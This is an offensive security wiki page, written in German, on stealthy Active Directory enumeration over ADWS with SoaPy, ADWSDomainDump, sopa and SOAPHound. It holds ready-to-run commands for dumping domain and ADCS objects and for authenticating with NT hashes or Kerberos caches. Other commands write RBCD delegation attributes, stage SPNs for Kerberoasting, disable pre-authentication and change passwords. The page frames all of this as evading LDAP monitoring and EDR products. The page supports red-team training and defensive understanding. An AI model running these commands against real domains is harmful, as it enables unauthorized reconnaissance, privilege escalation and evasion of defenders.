# Active Directory Web Services (ADWS) Enumeration & Stealth-Sammlung

{{#include ../../banners/hacktricks-training.md}}

## Was ist ADWS?

Active Directory Web Services (ADWS) ist **seit Windows Server 2008 R2 standardmäßig auf jedem Domain Controller aktiviert** und lauscht auf TCP **9389**.  Trotz des Namens ist **kein HTTP beteiligt**.  Stattdessen stellt der Dienst LDAP-ähnliche Daten über einen Stack proprietärer .NET-Framing-Protokolle bereit:<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Da der Traffic innerhalb dieser binären SOAP-Frames gekapselt ist und über einen ungewöhnlichen Port übertragen wird, ist **Enumeration über ADWS wesentlich weniger wahrscheinlich Gegenstand von Überwachung, Filterung oder Signaturerkennung als klassischer LDAP/389- und 636-Traffic**.  Für Operator bedeutet dies:<sup>[[1]](#references)[[7]](#references)</sup>

* Unauffälligere Aufklärung – Blue Teams konzentrieren sich häufig auf LDAP-Abfragen.
* Möglichkeit, Daten von **Nicht-Windows-Hosts (Linux, macOS)** zu sammeln, indem 9389/TCP über einen SOCKS-Proxy getunnelt wird.
* Dieselben Daten, die über LDAP abgerufen werden könnten (Benutzer, Gruppen, ACLs, Schema usw.), sowie die Möglichkeit, **Schreibvorgänge** durchzuführen (z. B. `msDs-AllowedToActOnBehalfOfOtherIdentity` für **RBCD**).

ADWS-Interaktionen werden über WS-Enumeration implementiert: Jede Abfrage beginnt mit einer `Enumerate`-Nachricht, die den LDAP-Filter/die Attribute definiert und eine `EnumerationContext`-GUID zurückgibt. Darauf folgen eine oder mehrere `Pull`-Nachrichten, die bis zum vom Server definierten Ergebnisfenster Daten streamen.<sup>[[7]](#references)</sup> Kontexte laufen nach etwa 30 Minuten ab. Daher muss das Tooling entweder Ergebnisse seitenweise abrufen oder Filter aufteilen (Präfixabfragen pro CN), um den Status nicht zu verlieren.<sup>[[8]](#references)</sup> Beim Abrufen von Security Descriptors sollte das `LDAP_SERVER_SD_FLAGS_OID`-Control angegeben werden, um SACLs wegzulassen. Andernfalls entfernt ADWS das Attribut `nTSecurityDescriptor` schlicht aus seiner SOAP-Antwort.

> HINWEIS: ADWS wird auch von vielen RSAT-GUI-/PowerShell-Tools verwendet, sodass sich der Traffic mit legitimer Administratoraktivität vermischen kann.

## SoaPy – Nativer Python-Client

[SoaPy](https://github.com/logangoins/soapy) ist eine **vollständige Neuimplementierung des ADWS-Protokollstacks in reinem Python**.  Das Tool erstellt die NBFX/NBFSE/NNS/NMF-Frames Byte für Byte und ermöglicht so das Sammeln von Daten auf Unix-ähnlichen Systemen, ohne die .NET-Runtime zu verwenden.<sup>[[1]](#references)[[2]](#references)</sup>

### Wichtige Funktionen

* Unterstützt **Proxying über SOCKS** (nützlich von C2-Implants aus).
* Fein abgestufte Suchfilter, identisch mit LDAP `-q '(objectClass=user)'`.
* Optionale **Schreiboperationen** ( `--set` / `--delete` ).
* **BOFHound-Ausgabemodus** für die direkte Verarbeitung durch BloodHound.<sup>[[3]](#references)</sup>
* Das `--parse`-Flag formatiert Zeitstempel / `userAccountControl` lesbarer, wenn eine bessere Verständlichkeit für Menschen erforderlich ist.<sup>[[2]](#references)</sup>

### Flags für gezielte Sammlung und Schreiboperationen

SoaPy wird mit kuratierten Schaltern ausgeliefert, die die gängigsten LDAP-Hunting-Aufgaben über ADWS nachbilden: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds` sowie die Raw-Optionen `--query` / `--filter` für benutzerdefinierte Abrufe. Diese können mit Schreibprimitiven wie `--rbcd <source>` (setzt `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN-Staging für gezieltes Kerberoasting) und `--asrep` (setzt `DONT_REQ_PREAUTH` in `userAccountControl`) kombiniert werden.<sup>[[2]](#references)</sup>

Beispiel für eine gezielte SPN-Suche, die nur `samAccountName` und `servicePrincipalName` zurückgibt:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Verwende denselben Host/dieselben Zugangsdaten, um die Findings unmittelbar zu weaponisieren: Liste mit `--rbcds` RBCD-fähige Objekte auf und wende anschließend `--rbcd 'WEBSRV01$' --account 'FILE01$'` an, um eine Resource-Based Constrained Delegation-Kette vorzubereiten (siehe [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) für den vollständigen Abuse-Pfad).

### Installation (Operator-Host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump über ADWS (Linux/Windows)

* Fork von `ldapdomaindump`, der LDAP queries durch ADWS calls über TCP/9389 ersetzt, um LDAP-signature hits zu reduzieren.
* Führt eine initiale Erreichbarkeitsprüfung für 9389 durch, sofern nicht `--force` übergeben wird (überspringt die Prüfung, wenn Port scans noisy/filtered sind).
* Mit Microsoft Defender for Endpoint und CrowdStrike Falcon getestet, mit erfolgreichem Bypass laut README.<sup>[[4]](#references)</sup>

### Installation
```bash
pipx install .
```
### Verwendung
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
Typische Ausgabe protokolliert die Erreichbarkeitsprüfung für Port 9389, das ADWS-Binding sowie den Start und Abschluss des Dumps:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa – Ein praktischer Client für ADWS in Golang

Wie soapy implementiert [sopa](https://github.com/Macmod/sopa) den ADWS-Protokoll-Stack (MS-NNS + MC-NMF + SOAP) in Golang und stellt Command-Line-Flags bereit, um ADWS-Aufrufe auszuführen, wie zum Beispiel:<sup>[[5]](#references)</sup>

* **Objektsuche und -abruf** – `query` / `get`
* **Objektlebenszyklus** – `create [user|computer|group|ou|container|custom]` und `delete`
* **Attributbearbeitung** – `attr [add|replace|delete]`
* **Accountverwaltung** – `set-password` / `change-password`
* sowie weitere Befehle wie `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]` usw.

### Highlights der Protokollzuordnung

* LDAP-ähnliche Suchen werden über **WS-Enumeration** (`Enumerate` + `Pull`) mit Attributprojektion, Bereichssteuerung (Base/OneLevel/Subtree) und Paginierung ausgeführt.
* Das Abrufen eines einzelnen Objekts verwendet **WS-Transfer** `Get`; Attributänderungen verwenden `Put`; Löschungen verwenden `Delete`.
* Die integrierte Objekterstellung verwendet **WS-Transfer ResourceFactory**; benutzerdefinierte Objekte verwenden eine durch YAML-Templates gesteuerte **IMDA AddRequest**.
* Passwortoperationen sind **MS-ADCAP**-Aktionen (`SetPassword`, `ChangePassword`).<sup>[[5]](#references)</sup>

### Unauthentifizierte Metadatenermittlung (mex)

ADWS stellt WS-MetadataExchange ohne Credentials bereit. Dies ist eine schnelle Möglichkeit, die Erreichbarkeit vor der Authentifizierung zu überprüfen:<sup>[[5]](#references)</sup>
```bash
sopa mex --dc <DC>
```
### Hinweise zur DNS/DC-Erkennung und zum Kerberos-Targeting

Sopa kann DCs über SRV ermitteln, wenn `--dc` weggelassen und `--domain` angegeben wird. Es fragt in dieser Reihenfolge ab und verwendet das Ziel mit der höchsten Priorität:<sup>[[5]](#references)</sup>
```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```
Verwende in der Praxis bevorzugt einen vom DC kontrollierten Resolver, um Fehler in segmentierten Umgebungen zu vermeiden:

* Verwende `--dns <DC-IP>`, damit **alle** SRV-/PTR-/Forward-Lookups über den DNS des DCs laufen.
* Verwende `--dns-tcp`, wenn UDP blockiert ist oder SRV-Antworten groß sind.
* Wenn Kerberos aktiviert ist und `--dc` eine IP-Adresse enthält, führt sopa einen **Reverse-PTR-Lookup** durch, um einen FQDN für die korrekte SPN-/KDC-Zielermittlung zu erhalten. Wenn Kerberos nicht verwendet wird, findet keine PTR-Abfrage statt.

Beispiel (IP + Kerberos, DNS über den DC erzwingen):
```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```
### Optionen für Authentifizierungsmaterial

Neben Klartextpasswörtern unterstützt sopa **NT hashes**, **Kerberos AES keys**, **ccache** und **PKINIT certificates** (PFX oder PEM) für die ADWS-Authentifizierung. Kerberos wird bei Verwendung von `--aes-key`, `-c` (ccache) oder zertifikatsbasierten Optionen impliziert.<sup>[[5]](#references)</sup>
```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```
### Erstellung benutzerdefinierter Objekte über Templates

Für beliebige Objektklassen verwendet der Befehl `create custom` ein YAML-Template, das einer IMDA-`AddRequest` entspricht:<sup>[[5]](#references)</sup>

* `parentDN` und `rdn` definieren den Container und den relativen DN.
* `attributes[].name` unterstützt `cn` oder den Namespace `addata:cn`.
* `attributes[].type` akzeptiert `string|int|bool|base64|hex` oder ein explizites `xsd:*`.
* Füge **nicht** `ad:relativeDistinguishedName` oder `ad:container-hierarchy-parent` ein; sopa fügt diese automatisch ein.
* `hex`-Werte werden in `xsd:base64Binary` konvertiert; verwende `value: ""`, um leere Strings zu setzen.

## SOAPHound – High-Volume ADWS Collection (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) ist ein .NET-Collector, der alle LDAP-Interaktionen innerhalb von ADWS hält und mit BloodHound v4 kompatibles JSON erzeugt. Ein vollständiger Cache aus `objectSid`, `objectGUID`, `distinguishedName` und `objectClass` wird einmalig erstellt (`--buildcache`) und anschließend für umfangreiche `--bhdump`-, `--certdump`- (ADCS) oder `--dnsdump`- (AD-integriertes DNS) Durchläufe wiederverwendet, sodass den DC nur etwa 35 kritische Attribute verlassen. AutoSplit (`--autosplit --threshold <N>`) teilt Abfragen automatisch anhand des CN-Präfixes auf, damit bei großen Forests das 30-minütige EnumerationContext-Timeout eingehalten wird.<sup>[[8]](#references)</sup>

Typischer Workflow auf einer domänenverbundenen Operator-VM:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Exportierte JSON-Daten direkt in SharpHound/BloodHound-Workflows – siehe [BloodHound methodology](bloodhound.md) für nachgelagerte Ideen zur Graphanalyse. AutoSplit macht SOAPHound in Forests mit mehreren Millionen Objekten resilient und hält dabei die Anzahl der Abfragen niedriger als bei ADExplorer-style Snapshots.

## Stealth AD Collection Workflow

Der folgende Workflow zeigt, wie **Domain- und ADCS-Objekte** über ADWS enumeriert, in BloodHound JSON konvertiert und nach zertifikatsbasierten Angriffspfaden gesucht wird – alles unter Linux:

1. **9389/TCP tunneln** vom Zielnetzwerk zu deiner Box (z. B. über Chisel, Meterpreter, SSH dynamic port-forward usw.).  Exportiere `export HTTPS_PROXY=socks5://127.0.0.1:1080` oder verwende SoaPy’s `--proxyHost/--proxyPort`.

2. **Das Root-Domain-Objekt sammeln:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Sammle ADCS-bezogene Objekte aus dem Configuration NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **In BloodHound konvertieren:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Laden Sie die ZIP-Datei** in die BloodHound GUI hoch und führen Sie Cypher-Abfragen wie `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` aus, um Zertifikats-Eskalationspfade (ESC1, ESC8 usw.) aufzudecken.

### `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD) schreiben
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Kombiniere dies mit `s4u2proxy`/`Rubeus /getticket` für eine vollständige **Resource-Based Constrained Delegation**-Kette (siehe [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Tooling Summary

| Zweck | Tool | Hinweise |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, read/write |
| ADWS-Dump mit hohem Volumen | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS-Modi |
| BloodHound-Ingest | [BOFHound](https://github.com/bohops/BOFHound) | Konvertiert SoaPy-/ldapsearch-Logs |
| Zertifikatskompromittierung | [Certipy](https://github.com/ly4k/Certipy) | Kann über denselben SOCKS-Proxy geleitet werden |
| ADWS enumeration und Objektänderungen | [sopa](https://github.com/Macmod/sopa) | Generischer Client zur Kommunikation mit bekannten ADWS-Endpunkten – ermöglicht enumeration, Objekterstellung, Attributänderungen und Passwortänderungen |

## References

- [1] [SpecterOps – Achte darauf, SOAP(y) zu verwenden – Ein Leitfaden für Operatoren zur unauffälligen AD-Sammlung mit ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy GitHub](https://github.com/logangoins/soapy)
- [3] [BOFHound GitHub](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa GitHub](https://github.com/Macmod/sopa)
- [6] [Microsoft – Spezifikationen MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – Unauffällige Enumeration von Active-Directory-Umgebungen über ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – SOAPHound-Tool zum Sammeln von Active-Directory-Daten über ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)
{{#include ../../banners/hacktricks-training.md}}
